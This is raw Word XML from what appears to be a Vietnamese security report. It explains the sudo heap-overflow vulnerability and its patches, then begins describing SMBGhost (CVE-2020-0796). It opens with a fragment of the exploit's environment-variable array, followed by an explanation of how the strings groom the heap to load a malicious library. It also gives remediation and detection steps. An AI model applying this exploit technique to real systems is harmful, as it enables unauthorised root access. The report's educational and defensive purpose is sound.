      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">        "\\", "\\", "\\", "\\", "\\", "\\", "\\",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724EF87E" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">        "x/x\\",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9FDE40" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Z",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="421E2D6B" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">        messages,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC1387E" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">        telephone,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A0EC5B" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        measurement,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1598037A" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">        NULL};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03CA1D71" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">Đây là chuỗi overflow được khởi tạo với các ký tự “X”, nhằm tạo ra một bộ đệm tràn. Mục tiêu là làm cho bộ nhớ được ghi đè và tạo ra một khoảng trống hoặc vị trí mà cấu trúc service_user có thể bị ghi đè. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD826EA" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Các chuỗi như “\”, “\”, “\</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>”,…</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve"> là những chuối chứa ký tự gạch chéo ngược được sử dụng để tác động lên bộ nhớ heap, một vùng nhớ dùng cho các đối tượng động trong quá trình thực thi chương trình. Khi các chuỗi này được đưa vào môi trường dưới dạng các biến môi trường, chúng có tác dụng điều chỉnh bộ nhớ heap (heap Fng Shui), giúp di chuyển các cấu trúc dữ liệu quan trọng vào vị trí có thể bị ghi đè. Ngoài ra, các chuỗi này còn có chức năng viết ký tự null vào bộ nhớ, giúp tránh các lỗi hoặc sự cố khi khai thác. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E59E3AB" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">Một chuỗi quan trọng khác là "XXXXXXX\:", có thể thay đổi vị trí của bộ nhớ heap hoặc ghi đè lên các phần bộ nhớ cụ thể, sao cho khi bộ đệm bị tràn, các dữ liệu quan trọng (như cấu trúc service_user) bị ghi đè một cách chính xác. Trong đó, chuỗi "x/x\" có ý nghĩa đặc biệt, vì khi bị ghi đè vào cấu trúc service_user, nó sẽ thay thế trường name của cấu trúc này bằng đường dẫn đến thư viện độc hại (x/x\), cho phép thực thi mã độc. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497FF4B5" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve"> Các biến môi trường như “LC_MESSAGES”, “LC_TELEPHONE” </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>và ”LC</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>_MEASUREMENT” có thể ảnh hưởng đến cách phân bổ bộ nhớ heap, giúp điều khiển vị trí bộ nhớ trong quá trình khai thác. Cuối cùng, một chuỗi kết thúc, chẳng hạn như "Z", sẽ được thêm vào để điều khiển kích thước bộ đệm hoặc kết thúc việc thay đổi môi trường, giúp hoàn thành quá trình khai thác mà không gặp phải lỗi hoặc sự cố bộ nhớ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CDB9893" w14:textId="6893DDED" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Một vấn đề khác là cách sudo quản lý bộ nhớ. Trong quá trình xử lý đầu vào, sudo sử dụng các vùng nhớ tạm thời trên heap để lưu trữ dữ liệu. Tuy nhiên, do không có biện pháp kiểm tra đủ mạnh, dữ liệu vượt qua giới hạn này sẽ ghi đè lên các phần bộ nhớ quan trọng, mở đường cho thực thi mã độc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAD4D30" w14:textId="0BB5AF2F" w:rsidR="0063397E" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">Các nhà nghiên cứu từ Qualys đã xác minh việc khai thác thành công trên các hệ điều hành phổ biến như Ubuntu 20.04 (Sudo 1.8.31), Debian 10 (Sudo </w:t>
      </w:r>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>1.8.27), Fedora 33 (Sudo 1.9.2). Bên cạnh đó, macOS, AIX, và Solaris cũng được báo cáo là dễ bị ảnh hưởng, cùng với các bản phân phói Unix/Linux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFD5E8D" w14:textId="0EF925F9" w:rsidR="0063397E" w:rsidRDefault="0063397E" w:rsidP="0063397E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc185277777"/>
      <w:r w:rsidRPr="0063397E">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Các</w:t>
      </w:r>
      <w:r w:rsidR="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>h khắc phục lỗ hổng</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="796BB2E0" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Phương pháp đơn giản và hiệu quả nhất để khắc phục lỗ hổng trên là cập nhật sudo lên phiên bản mới nhất. Phiên bản đã vá lỗi là 1.8.32 (cho các phiên bản legacy) và 1.9.5p2 (cho các phiên bản ổn định). Việc nâng cấp lên các phiên bản này sẽ giúp hệ thống không còn bị ảnh hưởng bởi lỗ hổng và giảm thiểu rủi ro bị khai thác. Quản trị viên có thể thực hiện việc cập nhật thông qua các lệnh sau tùy thuộc vào hệ điều hành sử dụng:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BA2E3E" w14:textId="6C73AB97" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Đối với Debian/Ubuntu: sudo apt update &amp;&amp; sudo apt install sudo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="088CC589" w14:textId="14ED3ECB" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Đối với CentOS/RHEL: sudo yum update sudo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B82D76A" w14:textId="204AC9C8" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Đối với Fedora: sudo dnf update sudo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="058EAB4B" w14:textId="32EEA97E" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Đối với macOS (nếu sử dụng Homebrew): brew upgrade sudo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4E0F0C" w14:textId="155B016A" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Sau khi cập nhật, quản trị viên có thể kiểm tra lại phiên bản sudo thông qua lệnh “sudo –version”. Nếu hệ thống đang sử dụng phiên bản đá vá thì hệ thống đã an toàn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A41F0B" w14:textId="5F52051D" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Trước khi cập nhật, quản trị viên có thể kiểm tra xem hệ thống có dễ bị tấn công hay không. Một trong những cách đơn giản để kiểm tra là sử dụng lệnh “sudoedit –s /”. Nếu hệ thống trả về thông báo lỗi như “Segmentation fault” hoặc “Memory corruption”, điều đó có nghĩa là sudo của bạn đang bị ảnh hưởng và cần phải được cập nhật ngay lập tức.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2147C11D" w14:textId="303CC652" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Trong trường hợp chưa thể cập nhật ngay lập tức, quản trị viên có thể thực hiện các biện pháp tạm thời để giảm thiểu nguy cơ bị tấn công. Một trong các biện pháp quan trọng là hạn chế quyền truy cập của người dùng. Chỉ những người dùng đáng tin cậy mới nên có quyền truy cập vào hệ thống, và tất cả các tài khoản không cần thiết cần được loại bỏ. Ngoài ra, các quyền sudo nên được cấu hình một cách chặt chẽ trong file /etc/sudoers để chỉ cho phép những lệnh cụ thể với quyền hạn nhất định.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ECFACDF" w14:textId="2691148D" w:rsidR="0063397E" w:rsidRPr="0063397E" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">Khi chờ đợi bản cập nhật, việc theo dõi các nhật ký hệ thống là rất quan trọng để phát hiện sớm các hoạt động đáng ngờ. Các log liên quan đến quyền sudo </w:t>
      </w:r>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>có thể được tìm thấy trong các file log như /var/log/auth.log (trên Debian/Ubuntu) hoặc /var/log/secure (trên CentOS/RHEL). Quản trị viên cần kiểm tra thường xuyên để phát hiện các dấu hiệu của việc khai thác lỗ hổng</w:t>
      </w:r>
      <w:r w:rsidR="0063397E" w:rsidRPr="0063397E">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E45CF4" w14:textId="74E2BAEC" w:rsidR="00AC146B" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc185277778"/>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>CVE-2020-0796 (SMBGhost)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
    </w:p>
    <w:p w14:paraId="3E9B128B" w14:textId="0967BCAA" w:rsidR="0036465C" w:rsidRPr="00A5474D" w:rsidRDefault="00752B4D" w:rsidP="0036465C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc185277779"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Mô tả</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w14:paraId="3B3D109E" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="0036465C" w:rsidP="00752B4D">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="341" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5474D">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00752B4D" w:rsidRPr="00752B4D">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Lỗ hổng bảo mật CVE-2020-0796, thường được biết đến với tên gọi SMBGhost, đại diện cho một lỗ hổng nghiêm trọng trong giao thức Server Message Block (SMB) phiên bản 3.1.1 của Microsoft, một phần quan trọng của hệ thống chia sẻ tệp và máy in trong môi trường Windows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B35285" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="341" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>SMBGhost có khả năng tạo điều kiện cho kẻ tấn công từ xa thực hiện tấn công Remote Code Execution (RCE), một dạng tấn công mà kẻ tấn công có thể thực thi mã độc hại từ xa mà không cần xác thực. Nguyên nhân của lỗ hổng xuất phát từ cách SMB 3.1.1 xử lý gói tin, mở ra khả năng thực hiện các hành động độc hại và kiểm soát toàn bộ hệ thống.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7178FA" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="341" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Tác động nguy cơ của CVE-2020-0796 là rất lớn, đặc biệt khi ảnh hưởng đến hàng triệu máy chủ và máy tính chạy hệ điều hành Windows. Microsoft đã phát hành bản vá và cập nhật bảo mật để khắc phục lỗ hổng này. Việc triển khai bản vá ngay lập tức là quan trọng để ngăn chặn khả năng khai thác và bảo vệ hệ thống khỏi rủi ro an ninh.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3B05A9" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="341" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Là một trong những lỗ hổng bảo mật quan trọng nhất trong năm 2020, SMBGhost nhấn mạnh về tầm quan trọng của việc duy trì bảo mật và thường xuyên cập nhật hệ thống để đối mặt với những thách thức an ninh ngày càng phức tạp trong môi trường kết nối mạng ngày nay.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1A7CF9" w14:textId="77777777" w:rsidR="00645FDE" w:rsidRDefault="00752B4D" w:rsidP="00645FDE">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:after="0" w:line="341" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="0005683B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1AC887CF" wp14:editId="07FAB834">
            <wp:extent cx="5758815" cy="3067885"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="49874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3529" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5758815" cy="3067885"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E233AF5" w14:textId="53F3AD8C" w:rsidR="00AC146B" w:rsidRPr="00645FDE" w:rsidRDefault="00645FDE" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:rFonts w:eastAsia="Calibri" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs/>
          <w:color w:val="auto"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc185277494"/>
      <w:r>
        <w:t xml:space="preserve">Hình 2. </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Hình_2. \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00746169">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00645FDE">
        <w:t>Lỗ hổng SMBGost CVE-2020-0796</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w14:paraId="18EF12A7" w14:textId="178BE874" w:rsidR="0036465C" w:rsidRPr="00A5474D" w:rsidRDefault="00184F6A" w:rsidP="0036465C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc185277780"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Nguyên nhân xảy ra</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w14:paraId="124BD926" w14:textId="2078FEB1"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Lỗ hổng bảo mật CVE-2020-0796, hay SMBGhost, bắt nguồn từ một vấn đề trong cách giao thức Server Message Block (SMB) phiên bản 3.1.1 của Microsoft xử lý các gói tin. Giao thức SMB là trách nhiệm chính cho việc chia sẻ tệp và máy in trong mạng máy tính, đặc biệt trong môi trường hệ điều hành Windows.</w:t>
      </w:r>
    </w:p>
